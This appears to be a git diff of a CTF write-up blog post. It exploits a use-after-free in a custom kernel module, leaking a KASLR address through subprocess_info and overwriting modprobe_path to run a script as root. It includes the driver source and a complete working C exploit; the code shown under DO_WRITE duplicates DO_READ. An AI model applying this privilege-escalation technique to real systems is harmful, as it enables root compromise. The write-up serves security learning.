@@ -1,6 +1,6 @@
 +++
 date = '2025-10-26T21:39:54+08:00'
-draft = true
+draft = false
 title = 'AYCEP2025 verysecretstorage Modprobe Path overwrite'
 categories = ["writeup"]
 tags = ["kernel", "pwn"]
@@ -41,33 +41,181 @@ Well the path is stored in a kernel symbol `modprobe_path` and is also in a writ
 
 #### Binary analysis:
 
-Now, I did the challenge with source code but during the actual event source code was not given so I shall also practice my ghidra skills here.
+Some set up stuff at the start:
 
-#### Setup stuff:
+```c
+struct req {
+    uint64_t idx;
+    uint64_t name_addr;
+    uint64_t note_size;
+    uint64_t note_addr;
+};
 
-pic of req and box box size blah blah 
+struct box {
+    char name[0x50];
+    uint64_t note_size; 
+    uint64_t note_addr;
+};
+
+
+void * box_array[0x30] = {0};
+unsigned int box_count = 0;
+```
 
 #### DO_CREATE:
+```c
+case DO_CREATE: { 
+  if (box_count >= 0x30) {
+      mutex_unlock(&storage_mutex); 
+      pr_info("Too many boxes!\n"); 
+      return -1; 
+      break;
+  }
+  box = kmalloc(sizeof(struct box), GFP_KERNEL);
+  ret = copy_from_user(buf, (void __user *) user_data.name_addr, 0x50-1);
+  memcpy(&box->name, buf, 0x50-1); 
+  memset(buf, 0, sizeof(buf));
+  if (user_data.note_size != 0) {
+      note = kmalloc(user_data.note_size, GFP_KERNEL);
+      box->note_addr = (uint64_t) note; 
+      box->note_size = user_data.note_size;
+      
+      // Copy information to the note
+      ret = copy_from_user(buf, (void __user *) user_data.note_addr, box->note_size);
+      memcpy((void *) note, buf, box->note_size-1);
+      memset(buf, 0, sizeof(buf));
+  }
+  box_array[box_count] = box; 
+  box_count = box_count + 1; 
+  mutex_unlock(&storage_mutex); 
+  return 0; 
+  break;
+}
 
-Allocates a box into the GFG_KERNEL account. The size of box is 0x60 so it goes into the kmalloc-96 cache. You also can add a note in.
+```
+Allocates a box into the GFP_KERNEL account. The size of box is 0x60 so it goes into the kmalloc-96 cache. You also can add a note by passing in note address and size along with the req struct.
 
 #### DO_READ:
+
+```c
+case DO_READ: {
+      if (user_data.idx > (box_count - 1)) {
+          mutex_unlock(&storage_mutex); 
+          pr_info("Invalid idx\n"); 
+          return -1; 
+          break;
+      }
+      box = box_array[user_data.idx]; 
+      memcpy(buf, &box->name, 0x50-1); 
+      ret = copy_to_user((void __user *)user_data.name_addr, buf, 0x50-1);
+      if (box->note_addr != 0 && box->note_addr != 0x10) {
+          memset(buf, 0x0, sizeof(buf)); 
+          memcpy(buf, (void *)box->note_addr, box->note_size-1); 
+          ret = copy_to_user((void __user *)user_data.note_addr, buf, box->note_size); 
+      }
+      mutex_unlock(&storage_mutex); 
+      return 0; 
+      break;
+  }
+```
 
 Reads the name and note from the box into the buffer provided by the req struct.
 
 #### DO_WRITE:
 
+```c
+case DO_READ: {
+    if (user_data.idx > (box_count - 1)) {
+        mutex_unlock(&storage_mutex); 
+        pr_info("Invalid idx\n"); 
+        return -1; 
+        break;
+    }
+    box = box_array[user_data.idx]; 
+    memcpy(buf, &box->name, 0x50-1); 
+    ret = copy_to_user((void __user *)user_data.name_addr, buf, 0x50-1);
+    if (box->note_addr != 0 && box->note_addr != 0x10) {
+        memset(buf, 0x0, sizeof(buf)); 
+        memcpy(buf, (void *)box->note_addr, box->note_size-1); 
+        ret = copy_to_user((void __user *)user_data.note_addr, buf, box->note_size); 
+    }
+    mutex_unlock(&storage_mutex); 
+    return 0; 
+    break;
+}
+```
+
 Writes a name and note to the box.
 
 #### DO_RESIZE:
+
+```c
+case DO_RESIZE: {
+    if (user_data.idx > (box_count - 1)) {
+        mutex_unlock(&storage_mutex); 
+        pr_info("Invalid idx\n"); 
+        return -1; 
+        break;
+    }
+    box = box_array[user_data.idx]; 
+    ret = copy_from_user(&box->name, (void __user *) user_data.name_addr, 0x50-1);
+    if (user_data.note_size != 0) {
+        kfree((void *)box->note_addr);
+        note = kmalloc(user_data.note_size, GFP_KERNEL); 
+        box->note_addr = (uint64_t)note; 
+        box->note_size = user_data.note_size; 
+        ret = copy_from_user(note, (void __user *) user_data.note_addr, user_data.note_size);
+    }
+    mutex_unlock(&storage_mutex); 
+    return 0; 
+    break;
+}
+```
 
 Resizes the note and copies the new note into it.
 
 #### DO_DELETE:
 
-Deletes a box and holy crap finally a vulnerability. The function frees the note and nulls it but when it frees the box it does not null it, leaving a dangling pointer that we can fandangle via a use-after-free(UAF).
+```c
+case DO_DELETE: {
+    if (user_data.idx > (box_count - 1)) {
+        mutex_unlock(&storage_mutex); 
+        pr_info("Invalid idx\n"); 
+        return -1; 
+        break;
+    }
+    box = box_array[user_data.idx]; 
+    if (box->note_addr != 0 && box->note_addr != 0x10) {
+        kfree((void *)box->note_addr); 
+        box->note_addr = 0; 
+    }
+    kfree(box); 
+    mutex_unlock(&storage_mutex); 
+    return 0; 
+    break;
+}
+```
+
+Deletes a box and holy crap finally a vulnerability. The function frees the note and nulls it but when it frees the box it does not null it, leaving a dangling pointer to the box that we can fandangle via a use-after-free(UAF). Knowing we have the ability to read or write to a box even after freeing it, what can we do?
 
 #### Exploit:
+
+Firstly, lets get some minor setup for the exploit out of the way. We should pin all threads of the process to one CPU core so all allocations come from the same cache.
+
+```c
+
+int cpuaff(void) {
+  puts("Setting cpu affinity\n");
+  cpu_set_t cpu;
+  CPU_ZERO(&cpu);
+  CPU_SET(0, &cpu);
+  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
+    perror("Sched_setaffinity not working\n");
+    exit(-1);
+  }
+  return 0;
+}
+```
 
 Since KASLR is active, we are going to need a kernel leak to calculate the address of `modprobe path`. How in the frick frack snick snack do we do that here?
 
@@ -75,20 +223,102 @@ Well, in my experience so far, kernel heap challenges often get leaks by overlap
 
 So we allocate 2 boxes, box0 and box1. We free box0 then immediately reclaim its spot with a `subprocess_info` by calling `socket(22, AF_INET, 0)`.
 
+```c
+  create(name, 0x100, note);
+  create(name, 0x100, note);
+  dodelete(0);
+  socket(22, AF_INET, 0);
+  doread(0, readname, readnote);
+```
+
 Since box0 is deleted but not nulled we can still read it and ta da, we get the information that `subprocess_info` is holding.
 
-This is the struct and we can see that it has a work_struct member then we dig deeper and we see that the work.func leak we need is at index 3 of the leaks.
+
+![subprocess_info](/post/secretstorage/images/subprocess_info.jpg)
+
+```c
+struct subprocess_info {
+	struct work_struct work;
+	struct completion *complete;
+	const char *path;
+	char **argv;
+	char **envp;
+	int wait;
+	int retval;
+	int (*init)(struct subprocess_info *info, struct cred *new);
+	void (*cleanup)(struct subprocess_info *info);
+	void *data;
+} __randomize_layout;
+
+struct work_struct {
+	atomic_long_t data;
+	struct list_head entry;
+	work_func_t func;
+```
+
+This is the struct and we can see that it has a work_struct member then we dig deeper and we see that the work.func leak we need is at index 3 of the leaks. (1st 8 bytes for `data`, 16 bytes for `list_head` and finally 8 bytes for `work.func`)
 
 If we start the qemu with root we can also check that the leak is pointing to `call_usermodehelper_exec_work`.
 
-Since the address `call_usermodehelper_exec_work` and `modprobe_path` are all relative we can just do some math to find `modprobe_path`.
-comment the eqn i did 
+![call_usermodehelper_exec_work](/post/secretstorage/images/call_usermodehelper_exec_work.jpg)
 
-Now that we have the `modprobe_path` address we need to resize the note to go into 0x60 cache and overwrite over box0 again and make sure that the new note size is big enough and the note address is the address of `modprobe_path`.
+Since the address `call_usermodehelper_exec_work` and `modprobe_path` are all relative we can just do some math to find `modprobe_path`.
+
+```c
+  //offset of mpp from call_usermodehelper_exec_work is 0x1a94080
+  uint64_t mpp = ((uint64_t *)readname)[3] + 0x1a94080;
+
+```
+
+Now that we have the `modprobe_path` address we need to resize the note to go into 0x60 cache and overwrite over box0 again and making sure that the new note size is big enough and the note address is the address of `modprobe_path`.
 
 Then we write to box0 with the new note being the path of the script that I want ran with root privileges.
 
-The script basically copies the stuff in `/dev/sda` into `/tmp/flag` as well as granting it full permissions and makes it executable. Then it makes an unknown file and runs it which should then trigger `modprobe_path` and run the script and now the flag from `/dev/sda` is inside `/tmp/flag` and we can view it
+```c
+  char overwrite[0x10];
+  memset(overwrite, 0, sizeof(overwrite));
+  strcpy(overwrite, "/tmp/x\x00");
+  char resize[0x100] = {0};
+  memset(resize, 0x45, 0x50);
+  ((uint64_t *)resize)[10] = 0x10;
+  ((uint64_t *)resize)[11] = mpp;
+  doresize(0, name, 0x60, resize);
+  dowrite(0, name, 0x10, overwrite);
+  get_flag();
+```
+
+Here is the before overwrite:
+
+![beforeoverwrite](/post/secretstorage/images/beforeoverwrite.jpg)
+
+And after overwrite:
+
+![afteroverwrite](/post/secretstorage/images/afteroverwrite.jpg)
+
+
+```c
+int get_flag(void) {
+  system("echo '#!/bin/sh\nhead -n 1 /dev/sda > /tmp/flag\nchmod 777 "
+         "/tmp/flag' > /tmp/x");
+  system("chmod +x /tmp/x");
+
+  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+  system("chmod +x /tmp/dummy");
+
+  printf("[+] Run unknown file\n");
+  system("/tmp/dummy");
+
+  printf("[+] Read flag\n");
+  system("cat /tmp/flag");
+
+  return 0;
+}
+```
+
+The script basically copies the stuff in `/dev/sda` into `/tmp/flag` as well as granting it full permissions and makes it executable. Then it makes an unknown file and runs it which should then trigger `modprobe_path` and run the script and now the flag from `/dev/sda` is inside `/tmp/flag` and we can view it.
+
+![finalflag](/post/secretstorage/images/finalflag.jpg)
+
 
 WAHEY! It worked, that's fantabbitastic.
 
@@ -96,11 +326,180 @@ Overall, this challenge was very fun and got me thinking in the kernel pwn minds
 
 Anyways, that's it for this text based youtube video. Please make sure to like 👍 and soobscribe and make sure to turn on the notification bell🔔 and see you guys [next time](https://youtu.be/oC2zvQ6B1Dw?si=Roa2V2vUd-jVzFRb).
 
+Here is my script.
 
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
+#define DO_CREATE 0xc020ca00
+#define DO_READ 0xc020ca01
+#define DO_WRITE 0xc020ca02
+#define DO_RESIZE 0xc020ca03
+#define DO_DELETE 0xc020ca04
 
+struct req {
+  uint64_t idx;
+  uint64_t name_addr;
+  uint64_t note_size;
+  uint64_t note_addr;
+};
 
+struct box {
+  char name[0x50];
+  uint64_t note_size;
+  uint64_t note_addr;
+};
 
+int fd;
+void opendev(void) {
+  fd = open("/dev/secretstorage", O_RDWR);
+  if (fd < 0) {
+    perror("open failed\n");
+  }
+  printf("Device opened successfully\n");
+}
 
+int cpuaff(void) {
+  puts("Setting cpu affinity\n");
+  cpu_set_t cpu;
+  CPU_ZERO(&cpu);
+  CPU_SET(0, &cpu);
+  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
+    perror("Sched_setaffinity not working\n");
+    exit(-1);
+  }
+  return 0;
+}
 
+int create(char *name, uint64_t note_size, char *note) {
+  printf("Creating box\n");
+  struct req userdata;
+  userdata.name_addr = (uint64_t)name;
+  userdata.note_size = note_size;
+  userdata.note_addr = (uint64_t)note;
+  int ret = ioctl(fd, DO_CREATE, &userdata);
+  if (ret < 0) {
+    perror("DO CREATE FAILED");
+  }
+  return 0;
+}
 
+int doread(uint64_t idx, char *namebuf, char *notebuf) {
+  printf("Reading from idx: %d\n", (int)idx);
+  struct req userdata;
+  userdata.idx = idx;
+  userdata.name_addr = (uint64_t)namebuf;
+  userdata.note_addr = (uint64_t)notebuf;
+  int ret = ioctl(fd, DO_READ, &userdata);
+  if (ret < 0) {
+    perror("DO_READ FAILED");
+  }
+  return 0;
+}
+
+int dowrite(uint64_t idx, char *name, uint64_t note_size, char *note) {
+  printf("Writing to box at idx: %d\n", (int)idx);
+  struct req userdata;
+  userdata.idx = idx;
+  userdata.name_addr = (uint64_t)name;
+  userdata.note_size = note_size;
+  userdata.note_addr = (uint64_t)note;
+  int ret = ioctl(fd, DO_WRITE, &userdata);
+  if (ret < 0) {
+    perror("DO WRITE FAILED");
+  }
+  return 0;
+}
+
+int doresize(uint64_t idx, char *name, uint64_t note_size, char *note) {
+  printf("Resizing box at idx: %d\n", (int)idx);
+  struct req userdata;
+  userdata.idx = idx;
+  userdata.name_addr = (uint64_t)name;
+  userdata.note_size = note_size;
+  userdata.note_addr = (uint64_t)note;
+  int ret = ioctl(fd, DO_RESIZE, &userdata);
+  if (ret < 0) {
+    perror("DO_RESIZE FAILED");
+  }
+  return 0;
+}
+
+int dodelete(uint64_t idx) {
+  printf("Deleting box at idx: %d\n", (int)idx);
+  struct req userdata;
+  userdata.idx = idx;
+  int ret = ioctl(fd, DO_DELETE, &userdata);
+  if (ret < 0) {
+    perror("DO_DELETE FAILED");
+  }
+  return 0;
+}
+
+int get_flag(void) {
+  system("echo '#!/bin/sh\nhead -n 1 /dev/sda > /tmp/flag\nchmod 777 "
+         "/tmp/flag' > /tmp/x");
+  system("chmod +x /tmp/x");
+
+  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+  system("chmod +x /tmp/dummy");
+
+  printf("[+] Run unknown file\n");
+  system("/tmp/dummy");
+
+  printf("[+] Read flag\n");
+  system("cat /tmp/flag");
+
+  return 0;
+}
+
+int main() {
+  cpuaff();
+  opendev();
+  char name[0x50] = {0};
+  char note[0x100];
+  char readname[0x100] = {0};
+  char readnote[0x100] = {0};
+  memset(note, 0x42, sizeof(note));
+  create(name, 0x100, note);
+  create(name, 0x100, note);
+  dodelete(0);
+  socket(22, AF_INET, 0);
+  doread(0, readname, readnote);
+  printf("subprocess_info struct\n");
+  for (int i = 0; i < (0x50 / 8); i++) {
+    printf("%d: 0x%llx\n", i, ((uint64_t *)readname)[i]);
+  }
+  // offset of mpp from call_usermodehelper_exec_work is 0x1a94080
+  uint64_t mpp = ((uint64_t *)readname)[3] + 0x1a94080;
+  printf("This is mpp: %llx\n", mpp);
+  char overwrite[0x10];
+  memset(overwrite, 0, sizeof(overwrite));
+  strcpy(overwrite, "/tmp/x\x00");
+  char resize[0x100] = {0};
+  memset(resize, 0x45, 0x50);
+  ((uint64_t *)resize)[10] = 0x10;
+  ((uint64_t *)resize)[11] = mpp;
+  doresize(0, name, 0x60, resize);
+  dowrite(0, name, 0x10, overwrite);
+  get_flag();
+  return 0;
+}
+```
+```
